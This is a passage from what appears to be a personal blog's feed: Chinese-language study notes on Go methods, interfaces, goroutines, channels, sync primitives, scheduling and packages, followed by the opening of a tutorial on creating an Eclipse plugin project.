class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> geometry</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;math&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Point <span class="keyword">struct</span>&#123; X, Y <span class="keyword">float64</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传统的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Distance</span><span class="params">(p, q Point)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Hypot(q.X-p.X, q.Y-p.Y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Point类型的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Point)</span> <span class="title">Distance</span><span class="params">(q Point)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Hypot(q.X-p.X, q.Y-p.Y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的在方法名之前加了个(p Point)，则表示这个方法是Point类型的独占方法，p叫做方法的接收器（receiver）。</p><p>reveiver甚至可以为int</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Hello <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Hello)</span> <span class="title">a</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是reveiver不能为指针，因为如果一个类型名本身是一个指针的话，是不允许其出现在接收器中的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Hello *<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Hello)</span> <span class="title">a</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// invalid receiver type Hello (pointer or interface type)compilerInvalidRecv</span></span><br></pre></td></tr></table></figure><p>嵌入构造体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name   <span class="keyword">string</span></span><br><span class="line">Age    <span class="keyword">int</span></span><br><span class="line">Height <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Man <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">// 匿名嵌入Person类型</span></span><br><span class="line">Sex    <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">man := Man&#123;Person: Person&#123;Name: <span class="string">&quot;hel&quot;</span>, Age: <span class="number">18</span>&#125;, Sex: <span class="string">&quot;male&quot;</span>&#125;</span><br><span class="line">  <span class="comment">// 可以直接man.Age 而不用man.Person.Age</span></span><br><span class="line">fmt.Println(man.Age)</span><br><span class="line">man.Age = <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>接口类型是一种抽象的类型。它不会暴露出它所代表的对象的内部值的结构和这个对象支持的基础操作的集合；它们只会表现出它们自己的方法。也就是说当你有看到一个接口类型的值时，你不知道它是什么，唯一知道的就是可以通过它的方法来做什么。</p><p>下面是一个简单的接口实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A <span class="keyword">interface</span> &#123;</span><br><span class="line">Show()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> B <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b B)</span> <span class="title">Show</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;name is %s&quot;</span>, b.Name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口组合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A <span class="keyword">interface</span> &#123;</span><br><span class="line">Show()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> C <span class="keyword">interface</span> &#123;</span><br><span class="line">A</span><br><span class="line">Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>在Go语言中，每一个并发的执行单元叫作一个goroutine，主函数返回时，所有的goroutine都会被直接打断，程序退出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> spinner(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">    <span class="keyword">const</span> n = <span class="number">45</span></span><br><span class="line">    fibN := fib(n) <span class="comment">// slow</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;\rFibonacci(%d) = %d\n&quot;</span>, n, fibN)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spinner</span><span class="params">(delay time.Duration)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> _, r := <span class="keyword">range</span> <span class="string">`-\|/`</span> &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;\r%c&quot;</span>, r)</span><br><span class="line">            time.Sleep(delay)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fib</span><span class="params">(x <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">2</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fib(x<span class="number">-1</span>) + fib(x<span class="number">-2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h3><p>channels则是goroutine之间的通信机制，一个channel可以让一个goroutine给另一个goroutine发送东西。</p><p>可以用make(chan int)来创建一个int的管道。</p><p>close() 来关闭一个channel。</p><p>可以使用for range来遍历channel。</p><p>channel带缓存 make(chan, 3)：表示创建缓存为3的channel。 </p><h3 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h3><p>select用于处理多个channel。</p><p>select会有一个default来设置当其它的操作都不能够马上被处理时程序需要执行哪些逻辑。</p><p>如果多个case同时就绪时，select会随机地选择一个执行，这样来保证每一个channel都有平等的被select的机会。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> x := &lt;-ch:</span><br><span class="line">fmt.Println(x) <span class="comment">// &quot;0&quot; &quot;2&quot; &quot;4&quot; &quot;6&quot; &quot;8&quot;</span></span><br><span class="line"><span class="keyword">case</span> ch &lt;- i:</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sync-Mutex互斥锁"><a href="#sync-Mutex互斥锁" class="headerlink" title="sync.Mutex互斥锁"></a>sync.Mutex互斥锁</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">result := <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> mu = sync.Mutex&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10000</span>; j++ &#123;</span><br><span class="line">mu.Lock()</span><br><span class="line">result++</span><br><span class="line">mu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;func done!&quot;</span>)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">fmt.Println(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sync-RWMutex读写锁"><a href="#sync-RWMutex读写锁" class="headerlink" title="sync.RWMutex读写锁"></a>sync.RWMutex读写锁</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mu sync.RWMutex</span><br><span class="line"><span class="keyword">var</span> account <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++ &#123;</span><br><span class="line">addAccount(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++ &#123;</span><br><span class="line">a := getAccount()</span><br><span class="line">fmt.Println(a)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addAccount</span><span class="params">(num <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">mu.Lock()</span><br><span class="line"><span class="keyword">defer</span> mu.Unlock()</span><br><span class="line">account += num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getAccount</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">mu.RLock()</span><br><span class="line"><span class="keyword">defer</span> mu.RUnlock()</span><br><span class="line"><span class="keyword">return</span> account</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RWMutex格式定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> RWMutex <span class="keyword">struct</span> &#123;</span><br><span class="line">w           Mutex        <span class="comment">// held if there are pending writers</span></span><br><span class="line">writerSem   <span class="keyword">uint32</span>       <span class="comment">// semaphore for writers to wait for completing readers</span></span><br><span class="line">readerSem   <span class="keyword">uint32</span>       <span class="comment">// semaphore for readers to wait for completing writers</span></span><br><span class="line">readerCount atomic.Int32 <span class="comment">// number of pending readers</span></span><br><span class="line">readerWait  atomic.Int32 <span class="comment">// number of departing readers</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sync-Once惰性初始化"><a href="#sync-Once惰性初始化" class="headerlink" title="sync.Once惰性初始化"></a>sync.Once惰性初始化</h3><p>每一次对Do(loadIcons)的调用都会锁定mutex，并会检查boolean变量（译注：Go1.9中会先判断boolean变量是否为1(true)，只有不为1才锁定mutex，不再需要每次都锁定mutex）。在第一次调用时，boolean变量的值是false，Do会调用loadIcons并会将boolean变量设置为true。</p><p>代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loadIconsOnce sync.Once</span><br><span class="line"><span class="keyword">var</span> icons <span class="keyword">map</span>[<span class="keyword">string</span>]image.Image</span><br><span class="line"><span class="comment">// Concurrency-safe.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Icon</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">image</span>.<span class="title">Image</span></span> &#123;</span><br><span class="line">    loadIconsOnce.Do(loadIcons)</span><br><span class="line">    <span class="keyword">return</span> icons[name]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Once里面定义了一个Mutex，如果done==0的话执行o.doSlow方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o *Once)</span> <span class="title">Do</span><span class="params">(f <span class="keyword">func</span>()</span>)</span> &#123;</span><br><span class="line"><span class="comment">// Note: Here is an incorrect implementation of Do:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if atomic.CompareAndSwapUint32(&amp;o.done, 0, 1) &#123;</span></span><br><span class="line"><span class="comment">//f()</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do guarantees that when it returns, f has finished.</span></span><br><span class="line"><span class="comment">// This implementation would not implement that guarantee:</span></span><br><span class="line"><span class="comment">// given two simultaneous calls, the winner of the cas would</span></span><br><span class="line"><span class="comment">// call f, and the second would return immediately, without</span></span><br><span class="line"><span class="comment">// waiting for the first&#x27;s call to f to complete.</span></span><br><span class="line"><span class="comment">// This is why the slow path falls back to a mutex, and why</span></span><br><span class="line"><span class="comment">// the atomic.StoreUint32 must be delayed until after f returns.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> atomic.LoadUint32(&amp;o.done) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// Outlined slow-path to allow inlining of the fast-path.</span></span><br><span class="line">o.doSlow(f)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>o.doSlow里面会使用Mutex的lock和Unlock进行锁操作。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o *Once)</span> <span class="title">doSlow</span><span class="params">(f <span class="keyword">func</span>()</span>)</span> &#123;</span><br><span class="line">o.m.Lock()</span><br><span class="line"><span class="keyword">defer</span> o.m.Unlock()</span><br><span class="line"><span class="keyword">if</span> o.done == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> atomic.StoreUint32(&amp;o.done, <span class="number">1</span>)</span><br><span class="line">f()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="竞争条件检测"><a href="#竞争条件检测" class="headerlink" title="竞争条件检测"></a>竞争条件检测</h3><p>只要在go build，go run或者go test命令后面加上-race的flag，就会使编译器创建一个你的应用的“修改”版或者一个附带了能够记录所有运行期对共享变量访问工具的test，并且会记录下每一个读或者写共享变量的goroutine的身份信息。另外，修改版的程序会记录下所有的同步事件，比如go语句，channel操作，以及对<code>(*sync.Mutex).Lock</code>，<code>(*sync.WaitGroup).Wait</code>等等的调用。</p><h3 id="goroutine"><a href="#goroutine" class="headerlink" title="goroutine"></a>goroutine</h3><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>每一个OS线程都有一个固定大小的内存块（一般会是2MB）来做栈，这个栈会用来存储当前正在被调用或挂起（指在调用其它函数时）的函数的内部变量。而一个goroutine会以一个很小的栈开始其生命周期，一般只需要2KB。一个goroutine的栈，和操作系统线程一样，会保存其活跃或挂起的函数调用的本地变量，但是和OS线程不太一样的是，一个goroutine的栈大小并不是固定的；栈的大小会根据需要动态地伸缩。而goroutine的栈的最大值有1GB。</p><h4 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h4><p>OS线程会被操作系统内核调度。每几毫秒，一个硬件计时器会中断处理器，这会调用一个叫作scheduler的内核函数。这个函数会挂起当前执行的线程并将它的寄存器内容保存到内存中，检查线程列表并决定下一次哪个线程可以被运行，并从内存中恢复该线程的寄存器信息，然后恢复执行该线程的现场并开始执行线程。因为操作系统线程是被内核所调度，所以从一个线程向另一个“移动”需要完整的上下文切换，也就是说，保存一个用户线程的状态到内存，恢复另一个线程的到寄存器，然后更新调度器的数据结构。</p><p>和操作系统的线程调度不同的是，Go调度器并不是用一个硬件定时器，而是被Go语言“建筑”本身进行调度的。例如当一个goroutine调用了time.Sleep，或者被channel调用或者mutex操作阻塞时，调度器会使其进入休眠并开始执行另一个goroutine，直到时机到了再去唤醒第一个goroutine。因为这种调度方式不需要进入内核的上下文，所以重新调度一个goroutine比调度一个线程代价要低得多。</p><h4 id="GOMAXPROCS"><a href="#GOMAXPROCS" class="headerlink" title="GOMAXPROCS"></a>GOMAXPROCS</h4><p>Go的调度器使用了一个叫做GOMAXPROCS的变量来决定会有多少个操作系统的线程同时执行Go的代码。其默认的值是运行机器上的CPU的核心数，所以在一个有8个核心的机器上时，调度器一次会在8个OS线程上去调度GO代码。（GOMAXPROCS是前面说的m:n调度中的n）。在休眠中的或者在通信中被阻塞的goroutine是不需要一个对应的线程来做调度的。在I/O中或系统调用中或调用非Go语言函数时，是需要一个对应的操作系统线程的，但是GOMAXPROCS并不需要将这几种情况计算在内。</p><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>Go语言的闪电般的编译速度主要得益于三个语言特性。</p><ul><li><p>  第一点，所有导入的包必须在每个文件的开头显式声明，这样的话编译器就没有必要读取和分析整个源文件来判断包的依赖关系。</p></li><li><p>  第二点，禁止包的环状依赖，因为没有循环依赖，包的依赖关系形成一个有向无环图，每个包可以被独立编译，而且很可能是被并发编译。</p></li><li><p>  第三点，编译后包的目标文件不仅仅记录包本身的导出信息，目标文件同时还记录了包的依赖关系。因此，在编译一个包的时候，编译器只需要读取每个直接导入包的目标文件，而不需要遍历所有依赖的的文件。</p></li></ul><p>包的匿名导入：</p><p>我们只是想利用导入包而产生的副作用：它会计算包级变量的初始化表达式和执行导入包的init初始化函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _ <span class="string">&quot;image/png&quot;</span> <span class="comment">// register PNG decoder</span></span><br></pre></td></tr></table></figure><p>数据库包database/sql也是采用了类似的技术，让用户可以根据自己需要选择导入必要的数据库驱动。例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">    _ <span class="string">&quot;github.com/lib/pq&quot;</span>              <span class="comment">// enable support for Postgres</span></span><br><span class="line">    _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span> <span class="comment">// enable support for MySQL</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">db, err = sql.Open(<span class="string">&quot;postgres&quot;</span>, dbname) <span class="comment">// OK</span></span><br><span class="line">db, err = sql.Open(<span class="string">&quot;mysql&quot;</span>, dbname)    <span class="comment">// OK</span></span><br><span class="line">db, err = sql.Open(<span class="string">&quot;sqlite3&quot;</span>, dbname)  <span class="comment">// returns error: unknown driver &quot;sqlite3&quot;</span></span><br></pre></td></tr></table></figure><h4 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h4><p>打包指定操作系统和内核。</p><ul><li>  GOOS环境变量用于指定目标操作系统（例如android、linux、darwin或windows）</li><li>  GOARCH环境变量用于指定处理器的类型，例如amd64、386或arm等</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GOOS=linux GOARCH=amd64 <span class="keyword">go</span> build</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h2&gt;&lt;h3 id=&quot;命名&quot;&gt;&lt;a href=&quot;#命名&quot; class=&quot;headerlink&quot; title=&quot;命名&quot;&gt;&lt;/a&gt;命名&lt;/h3&gt;&lt;p&gt;命名规</summary>
      
    
    
    
    <category term="go" scheme="http://fireflyingup.github.io/categories/go/"/>
    
    
    <category term="go" scheme="http://fireflyingup.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>搭建一个简单eclipse插件项目</title>
    <link href="http://fireflyingup.github.io/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/"/>
    <id>http://fireflyingup.github.io/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/</id>
    <published>2022-06-23T15:36:14.000Z</published>
    <updated>2023-12-19T01:38:53.822Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>​    这里主要记录如何手把手搭建一个eclipse的插件项目。</p><h2 id="引入插件"><a href="#引入插件" class="headerlink" title="引入插件"></a>引入插件</h2><p>​    由于eclipse插件开发需要plugin插件，所以要先去Help-&gt;Install New Software-&gt;选择对应ecipse版本的<a href="https://download.eclipse.org/releases/2022-06/202206151000%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80-&gt;%E9%80%89%E6%8B%A9General">https://download.eclipse.org/releases/2022-06/202206151000下载地址-&gt;选择General</a> Purpose Tools下的Eclipse Plug-in Development Environment，然后一路next-&gt;accept-&gt;finish，重启就可以创建一个plugin项目了。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624001026541.png"></div></div><h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><p>填入项目名称</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624001331584.png"></div></div><p>点击next，填写vender信息，勾选Generate an activator</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624001525493.png"></div></div><p>点击next，选择创建一个模版，这里选择hello world。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624001841133.png"></div></div><p>点击next，构建一个handler。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624002001614.png"></div></div><p>创建完之后我们看下目录结构</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624004252862.png"></div></div><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>目录里面主要的是plugin.xml这个文件，下面对这个文件进行解析，梳理页面与执行SampleHandler的逻辑。</p><p>plugin.xml文件如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 